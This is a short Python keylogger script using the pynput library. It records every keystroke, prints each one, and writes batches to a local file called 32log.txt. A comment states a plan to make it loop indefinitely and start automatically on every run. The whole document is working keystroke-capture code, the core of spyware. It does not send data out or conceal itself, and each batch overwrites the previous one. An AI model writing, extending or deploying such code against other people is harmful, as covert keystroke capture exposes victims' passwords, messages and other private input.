print("Kellogg Start")
from pynput.keyboard import Key, Listener



count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    
    with open("32log.txt", "w") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
            elif k.find("enter") >0:
                f.write("Screenshot")
            
def on_release(key):     
    if key == Key.esc:
        return False
    #if we want I can make this save the txt file then run an inf. loop
    #then make it always begin start on run
print("New Session Started")
print("UPDATE:")
with Listener(on_press=on_press, on_release=on_release)as listener:
    listener.join()
